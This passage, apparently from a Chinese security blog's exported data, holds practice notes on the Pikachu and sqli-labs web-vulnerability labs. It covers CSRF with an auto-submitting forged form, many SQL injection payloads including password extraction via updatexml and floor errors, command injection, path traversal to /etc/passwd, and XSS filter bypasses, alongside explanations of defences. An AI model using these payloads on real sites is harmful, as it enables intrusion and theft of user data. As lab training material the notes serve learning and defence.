2，修改个人信息的请求。但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：【http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。为啥小黑的操作能够实现呢。有如下几个关键点：\n1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;—因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;—如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。—因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。—所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：–对敏感信息的操作增加安全的token；–对敏感信息的操作增加安全的验证码；–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。\n\nCSRF(get)在尝试修改个人信息界面进行如下填写并抓包\n\n直接修改链接内容让受害者点击即可\n\n构造如下\n/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=2&amp;add=3&amp;email=4&amp;submit=submit\n\n如若受害者在登录状态点击该链接，即可达到攻击的目的\nget请求修改个人信息，所以内容均在url中体现，即可构造攻击连接\nCSRF(post)post与get不同，不可通过构造攻击连接进行攻击\n攻击者可以搭建一个站点，在站点上做一个表单，诱导受害者点击这个链接\n受害者点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息\n编写一个post.html\n代码如下：\n&lt;html&gt;&lt;head&gt;&lt;script&gt;window.onload = function() &#123;  document.getElementById(&quot;postsubmit&quot;).click();&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://localhost//pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php&quot;&gt;    &lt;input id=&quot;sex&quot; type=&quot;text&quot; name=&quot;sex&quot; value=&quot;girl&quot; /&gt;    &lt;input id=&quot;phonenum&quot; type=&quot;text&quot; name=&quot;phonenum&quot; value=&quot;0220&quot; /&gt;    &lt;input id=&quot;add&quot; type=&quot;text&quot; name=&quot;add&quot; value=&quot;china&quot; /&gt;    &lt;input id=&quot;email&quot; type=&quot;text&quot; name=&quot;email&quot; value=&quot;0220@pikachu.com&quot; /&gt;    &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n笔者存放位置为 \nhttp://localhost//jennie/post.html \n\n即受害者点击笔者存该改页面链接时收到攻击\nCSRF(token)CSRF的主要问题是敏感操作容易被伪造\n加入一个随机的token使之不易被伪造\n\n每次请求多了一个随机的token值，这是一个相对安全的\n附CSRF：CSRF\n概述\nCSRF 是 Cross Site Request Forgery 的 简称，中文名为跨域请求伪造\n在CSRF的攻击场景中，攻击者会伪造一个请求（一般是一个链接）\n然后欺骗目标用户进行点击，用户一旦点击了这个请求，这个攻击也就完成了\n所以CSRF攻击也被称为“one click”攻击\n\nCSRF攻击需要条件\n  ① 目标网站没有对修改个人信息修改的请求进行防CSRF处理，导致该请求容易被伪造\n因此，判断一个网站有没有CSRF漏洞，其实就是判断对关键信息（密码等）的操作（增删改）是否容易被伪造\n  ② lucy点击伪造的请求链接时有登录状态（已经登陆了目标网站），如果lucy没有登录，那么即便lucy点击了链接也没有作用\n从CSRF的利用条件来看，CSRF的利用难度会大一些，所以CSRF对应的安全级别低一些\n\nCSRF和XSS的区别\n我们利用XSS可以达到盗取用户Cookie的目的，那么CSRF的区别在哪？\n\nCSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。\nXSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。\n\n\n如何确认一个目标站点是否有CSRF漏洞\n 对目标站点增删改查的地方进行标记，并观察逻辑，判断请求是否可以伪造。\n\n比如修改管理员账号时，不需要验证旧密码\n比如修改敏感信息不需要token验证\n\n 确认凭证的有效期\n虽然退出或关闭了览器，但Cookie仍然有效，或者Session没有及时过期，导致CSRF攻击变得简单\n\n防护\n\n增加Token验证（常用做法）\n\n\n对关键操作增加Token参数，token必须随机，每次都不一样\n\n\n\n关于安全的会话管理（避免会话被利用）\n\n\n不要在客户端保存敏感信息（比如身份验证信息）\n退出、关闭浏览器时的会话过期机制\n设置会话过机制，比如15分钟无操作，则自动登录超时\n\n\n\n访问控制安全管理\n\n\n敏感信息的修改时需要身份进行二次认证，比如修改账号密码，需要判断旧密码\n敏感信息的修改使用POST，而不是GET\n通过HTTP头部中的REFERER来限制原页面\n\n\n\n增加验证码\n\n\n一般在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）\n\n\n\nSQL-inject\nSQL注入概述\nSQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；2.使用参数化（Parameterized Query 或 Parameterized Statement）；3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!\n\n数字型注入（post）抓包后，取id=2与id=3-1得到相同回显\n即存在数字型注入\n按部就班以从《从0到1》上学到的关于数字型注入的方法\n事先已经先通过id=2与id=3-1得到相同回显判断这里存在数字型注入\n且MySQL5.0版本后默认自带数据库information_schema，所有数据库名、表名、字段名都可从中查询\n利用这一点，构造\nid=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()\n\n得到回显\n\n对查询到的表进行二次查询，构造\nid=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;member&#x27;\n\n即为查询member中内容\n我就只查询member中内容便发现我们想要的id与email\n构造查询\nid=-1 union select id,email from member\n\n得到回显\n\n或输入id=1 or 1=1亦可展示所有信息\n字符型注入（get）字符型需闭合前面的单引号，再注释查询内容后面的语句\n构造时符号使用的为URL编码\n在查询后面加入相应符号URL编码\n\n查询执行成功\n在两符号中间插入上文所提到的查询语句即可\n构造\nkobe%27union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23\n\n得到回显\n\n最后得到所有信息如下\n\n同样的查询语句输入\nor 1=1\n\n亦可\n搜索型注入题目提示输入用户名的一部分进行查找\n构造闭合%‘\n即构造\n%&#x27;查询#\n\nxx型注入依旧是按要求构造闭合\n\nkobe&#x27;) 查询#\n\n“insert/update”注入在insert/update/delete注入这几种情况中\n不能使用 union 进行联合查询\n因为这不是查询，而是操作\ninsert 设置用户名\n这里一般通过or进行闭合\n选择注册\n在用户名栏中构造\nBEACON&#x27; or updatexml(1, concat(0x7e,database()), 0) or &#x27;\n\n利用报错进行我们的操作\nupdate 修改密码\n一样的构造，亦可\n“delete”注入在进行删除时，抓包修改id值为我们构造的代码即可\n1 or updatexml(1, concat(0x7e,database()), 0) \n\n“http header”注入\n\n\nadmin&#x27; or updatexml(1, concat(0x7e, database()), 0)#\n\n盲注（base on boolian）\n基于真假的盲注主要特征\n\n\n\n没有报错信息\n\n\n\n不管是正确的输入，还是错误的输入，都只有两种情况（可以看做 0 or 1）\n\n\n\n在正确的输入下，后面跟 and 1=1 / and 1=2 进行判断\n\n\n\n测试语句\nkobe&#x27; and 1=1#kobe&#x27; and 1=2#\n\n前者可行，后者提示用户名不存在\n此处输出仅有用户名存在与不存在两种形式，故不能使用之前基于报错注入的形式\n\n我们只能通过 真 或者 假 来获取数据，所以手工盲注是很麻烦的\n我们可以先用 length(database()) 判断 数据库名称的长度\nkobe&#x27; and length(database())&gt;5#……kobe&#x27; and length(database())=7#\n\n再用 substr() 和 ascii() 判断数据库由哪些字母组成（可以用二分法）\nkobe&#x27; and ascii(substr(database(), 1, 1)) &gt; 113#kobe&#x27; and ascii(substr(database(), 1, 1)) &gt; 105#……kobe&#x27; and ascii(substr(database(), 1, 1)) = 112#\n\n不断重复，然后取得数据库名。再和 information_schema 和 length 猜测 表名 的长度，我们可以用下面的 SQL 语句替代上面的 database()\n(select table_name from information_schema.tables where table_schema=database() limit 0,1)\n\n先判断表名长度\nkobe&#x27; and  length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,100)) = 8#\n\n然后猜解表名\nkobe&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1)) &gt; 113#……kobe&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1)) =104#\n\n同样的方法去猜解列名、数据，就是麻烦，用工具会方便些\n\n盲注（base on time）\n基于真假的盲注可以看到回显的信息，正确 or 错误\n基于时间的注入就什么都看不到了，我们通过特定的输入，判断后台执行的时间，从而确定注入点，比如用 sleep() 函数\n在皮卡丘平台一，无论输入什么，前端都是显示 “I don’t care who you are!”\n我们按 F12 打开控制台，选到网络\n然后我们输入下面的 payload 进行测试\nkobe&#x27; and sleep(5)#\n\n如果存在注入点，后端就会 sleep 5秒才会返回执行结果\n\n看到上面的结果说明我们注入成功了，构造下面的 payload，用 database() 取得数据库的名称，再用 substr 取字符判断数据库名称的组成，如果猜解成功就会 sleep 5秒，否则没有任何动作\nkobe&#x27; and  if((substr(database(), 1, 1))=&#x27;p&#x27;, sleep(5), null)#\n\n后面也跟真假注入是一样的了，替换 database() 就可，如\nkobe&#x27; and  if((substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1))=&#x27;h&#x27;, sleep(5), null)#\n\n宽字节注入附SQL注入：SQL注入\n发生原因\nSQL注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击者可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库对其进行执行，导致数据库信息泄漏的一种漏洞。\n\nSQL注入攻击流程\n第一步：注入点探测\n\n自动方式：使用web漏洞扫描工具，自动进行注入点发现\n手动方式：手工构造SQL注入测试语句进行注入点发现\n\n第二步：信息获取\n 通过注入点取得期望得到的数据\n\n1.环境信息：数据库类型，数据库版本，操作系统版本，用户信息等\n2.数据库信息：数据库蜜罐，数据库表，表字段，字段内容等（加密内容破解）\n\n第三步：获取权限\n 获取操作系统权限：通过数据库执行shell，上传木马\n\n注入点类型按SQL语句拼接类型区分\n\n数字型：user_id=$id\n字符型：user_id=’$id’\n搜索型：text LIKE ‘%{$_GET[‘search’]}%’”\n\nSQL中三种注释\n① #\n② – （最后面有个空格）\n③ /**/，内联注释，这个可以在SQL语句中间使用。select * from /sqli/ users;\n\n基于函数报错注入（updatexml）\n技巧思路：\n\n在 MySQL 中使用一些指定的函数来制造报错，从报错信息中获取设定的信息\nselect / insert /update / delete 都可以使用报错来获取信息\n\n背景条件：\n\n后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端\n\n三个常用函数\n\nupdatexml()： MySQL 对 XML 文档数据进行查询和修改的 XPATH 函数\nextractvalue()：MySQL 对 XML 文档数据进行查询的 XPATH 函数\nfloor()：MySQL中用来取整的函数\n\n\nupdatexml()具体\n updatexml()函数作用：改变（查找并替换）XML 文档中符合条件的节点的值\n 语法：UPDATEXML (XML_document, XPath_string, new_value)\n\n\n第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc\n\n\n\n第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。不过这里用不到。\n\n\n\n第三个参数：new_value，String格式，替换查找到的符合条件的数据\n\n\n\nXpath语法：https://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html\n\n\n\n\nXPath 定位必须是有效的，否则会发生错误\n\n在字符型注入中测试\n&#x27; and updatexml(1, version(), 0)#\n\n报错\n继续构造\n&#x27; and updatexml(1, concat(0x7e, version()), 0)#\n\n\n修改 version() 为 database() 即可得数据库名称\n查询表名\n&#x27; and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27;)), 0)#\n\n报错\n\n在 payload 后面用 limit 关键字，限制取回的结果即可\n&#x27; and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1)), 0)#\n\n\n上面返回了查询结果中的第一个表名，如果要查询第二个表名，我们可以把 limit 语句换成 limit 1,1\nlimit 后的第一个数据是起始位置，第二个数字是取出的数据条数\n\n获取字段\n&#x27; and updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)), 0)#\n\n 获取数据\n&#x27; and updatexml(1, concat(0x7e, (select username from users limit 0,1)), 0)#\n\n获取密码\n&#x27; and updatexml(1, concat(0x7e, (select password from users where username = &#x27;admin&#x27; limit 0,1)), 0)#\n\nextractvalue() extractvalue()函数作用：从目标 XML 中返回包含所查询值的字符串\n 语法：ExtractValue(xml_document, XPathstring)\n\n\n第一个参数：xml_document 是 string 格式，为 XML 文档对象的名称\n\n\n\n\n第二个参数： XPathstring，XPath 格式的字符串\n\n\n构造\n&#x27; and extractvalue(1, concat(0x7e,database())) #\n\nfloor()向下取整。如果要用 floor() 构成报错，必须满足下面的条件\n\n\n运算中有 count\n\n\n\n运算中有 group by\n\n\n\n运算中有 rand\n\n\n\n构造\n&#x27; and (select 2 from (select count(*), concat(version(), floor(rand(0) * 2))x from information_schema.tables group by x)a)#\n\n\n上面表达式执行的结果会以 “a” 作为别名，然后在 字符型注入 中提交，会得到下面的报错\n\n我们可以把 version() 的表达式替换成别的表达式\n&#x27; and (select 2 from (select count(*), concat((select password from users where username=&#x27;admin&#x27; limit 0,1), floor(rand(0) * 2))x from information_schema.tables group by x)a)#\n\nRCE\nRCE(remote command/code execute)概述\nRCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。远程系统命令执行一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器\n现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_-远程代码执行同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。\n\nexec “ping”ping\n127.0.0.1\n\n出现如下结果\n\n出现乱码\n解决方法：\n\n我自己尝试了一下，没有解决\n再到网上搜其他方法，也没有解决\n或许可以通过在源代码上增加转为UTF-8的几行代码\n这一个没有去尝试\n\n在命令执行漏洞中，可通过&amp;、&amp;&amp;、|、||、; 等符号拼接执行命令\n如：\n127.0.0.1 &amp; ipconfig\n\n不仅执行ping命令，ipconfig也执行\nexec “evel” \n可直接执行PHP代码\nphpinfo()；\n\nFile Inclusion\nFile Inclusion(文件包含漏洞)概述\n文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：include(),include_once()require(),require_once()这些文件包含函数，这些函数在代码设计中被经常使用到。\n大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：\n1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。\n\n附文件包含：介绍\nunsafe filedownload\n不安全的文件下载概述\n文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。\n此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！\n\n附不安全文件下载：介绍\nunsafe upfileupload\n不安全的文件上传漏洞概述\n文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：\n–验证文件类型、后缀名、大小;–验证文件的上传方式;–对文件进行一定复杂的重命名;–不要暴露文件上传后的路径;–等等…\n\nclient check删掉前端限制代码即可\n\nMIME type上传时，通过BP修改文件后缀\ngetimagesize\n\n\n附不安全文件上传：详细\nover permission\n概述\n如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。因此，在在权限管理中应该遵守：1.使用最小权限原则对用户进行赋权;2.使用合理（严格）的权限校验规则;3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;\n\n水平越权查看lucy账号信息\n\n这里运用了GET 请求\n将lucy改为lili\n则可查看lili的信息\n垂直越权\n\n","categories":["CTF-WEB"],"tags":["练习记录","pikachu"]},{"title":"对XSS的基础了解","url":"/2021/%E5%AF%B9XSS%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/","content":"XSS-XSS基础XSS攻击即为跨站脚本攻击（Cross Site Scripting）\n\n通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。\n\n前端漏洞，受害者为前端用户\n攻击原理\nHTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始，与之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。\n\n特点XSS相比于钓鱼网站危害更大\nXSS具有以下特点：\n\n①由于XSS攻击在用户当前使用的应用程序中执行，用户将会看到与其有关的个性化信息，如账户信息或“欢迎回来”消息，克隆的Web站点不会显示个性化信息。\n②通常，在钓鱼攻击中使用的克隆Web站点一经发现，就会立即被关闭。\n③许多浏览器与安全防护软件产品都内置钓鱼攻击过滤器，可阻止用户访问恶意的克隆站点。\n④如果客户访问一个克隆的Web网银站点，银行一般不承担责任。但是，如果攻击者通过银行应用程序中的XSS漏洞攻击了银行客户，则银行将不能简单地推卸责任。\n\n类型按攻击代码的工作方式分：\n1.持久行跨站（存储型）：\n  最直接的危害类型，跨站代码储存在服务器（数据库）\n  永久性储存\n2.非持久型跨站（反射型）：\n  反射型跨站脚本漏洞，最普遍的类型\n  一次性\n3.DOM跨站（DOM XSS）：\n  通过DOM操作前端代码输出时产生\n  一次性\n\n基于DOM的XSS漏洞是指受害者端的网页脚本在修改本地页面DOM环境时未进行合理的处置，而使得攻击脚本被执行。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果差异的原因是对本地DOM的恶意篡改利用。\n\n形成原因XSS漏洞形成的主要原因是程序对于输入与输出没有做到严格的把控导致攻击脚本被当作有效代码执行\nXSS漏洞测试流程\n① 在目标上找输入点，比如查询接口、留言板\n② 输入一组 “特殊字符（&gt;，’，”等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理\n③ 通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件（构造闭合）\n④ 提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XSS漏洞\n\n常用XSS攻击手段与目的\n1、盗用cookie，获取敏感信息。\n2、利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。\n3、利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。\n4、利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。\n5、在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。\n\nXSS基础过滤1.抓包重新插入，或修改前端HTML代码\n2.修改大小写，若正则匹配只匹配小写，则可绕过\n3.双写（拼凑），例如\n&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt;pt&gt;\n\n后台即使过滤script，也有只过滤一次的可能\n4.注释干扰，例如\n&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/sc&lt;!--test--&gt;ript&gt;\n\n加上注释后，有绕过后台过滤机制的可能\n5.编码，例 \n&lt;img src=x onerror=alert(&#x27;xss&#x27;)&gt; \n\n经过HTML编码为：\n&lt;img src=x onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;&gt; \n\n练习反射型xss（get or post）先判断有无过滤，然后写入xss代码\n示例：\n&lt;script&gt;alert(&quot;BEACON&quot;)&lt;/script&gt; \n\n存储型xss寻找输入点，然后进行xss攻击\nDOM型XSS例一：\n我们先通过 “&gt; 闭合了herf标签，然后再插入相应的payload\n根据提示构造payload ‘\n&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt; \n\n例二：\n与前面不同的是，前面通过 getElementById 获取到了标签 Id 为 text的内容赋值给str\n然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a标签会写到 Id 为 dom的 div 标签中\n这里则是定义了一个domxss函数\n利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str\n然后经过URL解码和字符串分隔，取出URL中的参数内容\n再把 “+” 替换为 “ ”（空格），赋值给 xss\n最后把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中\n跟前面的DOM不同的是，它的输入是从浏览器的URL中获取的\n附基于pikachu漏洞练习平台关于XSS介绍与练习\n","categories":["CTF-WEB"],"tags":["XSS"]},{"title":"SQL-[sqli-labs]","url":"/2021/SQL-%5Bsqli-labs%5D/","content":"sqli-labs  SQL基础学习过程中的练习记录\n注入技巧使用优先级是：UNION注入&gt;报错注入&gt;布尔盲注&gt;时间盲注\n\n注意点判断闭合形式注入过程中一大关键点是对注入点闭合形式的判断\n而这判断，九分就靠猜测\n举Less-7为例（刚好做到这题想着整理一下，没有瞧不起其他题的意思）\n猜测其闭合形式为((‘’))\n访问\nid=1&#x27;)) and 1=1--+\n\n\n输出正常\n访问\nid=1&#x27;)) and 1=2--+\n\n\n页面报错\n这就证明了我们的猜测是正确的\n如若猜测错误\n访问\nid=1&quot;)) and 1=1--+\n\n\n页面显示正常\n但是，当访问\nid=1&quot;)) and 1=2--+\n\n页面没有发生变化\n而正常情况下，由于1=2是错误的，页面应报错或无回显\n两个重要系统变量@@datadir 读取数据库路径\n@@basedir 读取MySQL路径\n示例：\nhttp://sqli-labs/Less-1/?id=-1&#x27; union select 1,@@datadir,@@basedir--+\n\n\n题目（GET）Less-1①普通联合测试注入型\n访问id=2与id=3-1回显不同，排除数字型注入\n访问id=1a与id=1回显相同，即可判断该注入点为字符型注入\n访问\nid=1&#x27;--+\n\n得到与id=1相同回显，确定为字符型注入\n将查询语句输入到单引号与注释符之间即可\n从”order by 1”开始测试，直到访问到\nid=1&#x27;order by 4--+\n\n页面出错，即可判断字段数为”3”\n访问\nid=-1&#x27;union select 1,2,3--+\n\n页面回显\n\n即可在’2’或”3”位置输入查询语句\n查询本数据库所有表名\nid=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+\n\n输出为”emails,referers,uagents,users”\n查询”emails”中内容\nid=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;emails&quot;--+\n\n输出为”id,email_id”\n访问\nid=-1&#x27; union select 1,2,group_concat(id,email_id) from emails--+\n\n\n查询其他表用类似查询语句即可\n②报错注入亦可使用报错注入，示例：\nid=-1&#x27; union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+\n\n③布尔盲注布尔盲注，示例：\nid=-1&#x27; union select 1,2,length(database())&gt;=1--+\n\n④时间盲注时间盲注，示例：\nid=-1&#x27; union select 1,2,if(length(database())&gt;1,sleep(5),1)--+\n\nLess-2访问id=2与id=3-1回显相同，即为数字型注入\n如Less-1使用union联合注入\nid=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\n\nLess-3同Less-1测试注入型，为字符型注入\nid=1&#x27;)--+\n\nid闭合使用(‘’)\nid=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+\n\nLess-4同三\n闭合方式不同\n该题的闭合方式是(“”)\n访问\nid=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+\n\nLess-5简单判断注入类型\n尝试报错注入\nid=1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+\n\n\n将插在中间的查询语句修改为其他查询语句，即可开始查询\n示例：\nid=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+\n\nLess-6同Less-5\n报错注入\n闭合方式不同，使用””闭合\nid=1&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+\n\nLess-7先找出闭合方式\n闭合方式为((‘’))\n啥都没显示，选择盲注\n布尔盲注\nid=1&#x27;)) and length(database())&gt;=1--+\n\n时间盲注\nid=1&#x27;)) and if(length(database())&gt;1,sleep(5),1)--+\n\n其实，根据题目提示，这题本该使用’outfile’进行相关注入\n但经过尝试，出现一些问题，目前没有解决，所以先使用盲注\n相比于其他注入\n布尔盲注与时间盲注更为麻烦\nLess-8寻找闭合，闭合方式为’’\n布尔盲注\nid=1&#x27; and length(database())&gt;=1--+\n\n时间盲注\nid=1&#x27; and if(length(database())&gt;1,sleep(5),1)--+\n\nLess-9随便输入啥都没有变化\n盲猜闭合方式就是普通的’’\n由于没报错回显，只能使用时间盲注\nid=1&#x27; and if(length(database())&gt;1,sleep(5),1)--+\n\nLess-10同Less-9\n闭合方式改变，为””\nid=1&quot; and if(length(database())&gt;1,sleep(5),1)--+\n\n题目（POST）Less-11①普通联合第十一题开始就为POST型注入\nPOST与GET其实大同小异\n仅是注入的位置发生改变，注入的方法没有改变\n这里使用Burp Suite来修改POST值\n选择uname作为SQL语句的输入点，passwd可随意输入\n首先还是判断闭合方式\nuname=-1&#x27;or 1=1--+&amp;passwd=123&amp;submit=Submit\n\n\n即闭合方式为’’\n判断字段数\nuname=-1&#x27;order by 3--+&amp;passwd=123&amp;submit=Submit\n\n\nuname=-1&#x27;order by 